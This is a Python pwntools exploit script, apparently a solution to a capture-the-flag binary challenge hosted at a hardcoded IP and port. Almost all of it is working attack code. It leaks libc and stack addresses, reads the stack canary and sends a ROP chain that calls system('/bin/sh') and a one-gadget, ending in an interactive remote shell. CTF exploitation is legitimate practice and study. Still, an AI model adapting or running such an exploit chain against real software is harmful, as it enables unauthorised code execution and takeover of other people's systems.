#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.243 --port 14022 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.243'
port = int(args.PORT or 14022)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
# b *0x400B31
b *0x400d8a
b *0x400e5c
continue
c
# b *fwrite+30
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()


libc = ELF("libc-2.27.so")

def edit(name,add):
    io.sendlineafter("> ","1")
    io.sendafter("> ",str(name))
    io.sendafter("> ",str(add))

edit("a"*8,"0")

io.recvuntil("a"*8)

leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(leak)

libc.address = leak - libc.sym['atoi']-16
print hex(libc.address)

# x/100gx 0x6020e0+32*140
# x/100gx 0x6020F8

hitung = libc.sym['environ'] - 0x6020e0

io.sendlineafter("> ","2")
io.sendlineafter("?\n",str(hitung/32))

io.recvuntil("Detail: ")
io.recv(24)

stack = u64(io.recv(8))
print hex(stack)

hitung = stack - 0x120 - 0x6020e0

io.sendlineafter("> ","2")
io.sendlineafter("?\n",str(hitung/32))

io.recvuntil("Detail: ")
io.recv(8)

canary = u64(io.recv(8))
print hex(canary)

buff = stack - 0x228
leave = 0x400e5c

off = [0x4f3d5,0x4f432,0x10a41c]
one = libc.address + off[0]

pop_rdi = libc.search(asm("pop rdi ; ret")).next()
io.sendlineafter("> ","3")
p = ''
p += p64(pop_rdi)
p += p64(libc.search("/bin/sh\x00").next())
p += p64(pop_rdi+1)
p += p64(libc.sym['system'])
p = p.ljust(256,"a")
# p += p64(stack)
p += p64(libc.sym['_IO_2_1_stdout_'])
p += p64(canary)
p += p64(buff-8)
p += p64(one)
# p += p64(leave)

io.sendafter("> ",p.ljust(0x12c,"\x00"))

io.interactive()

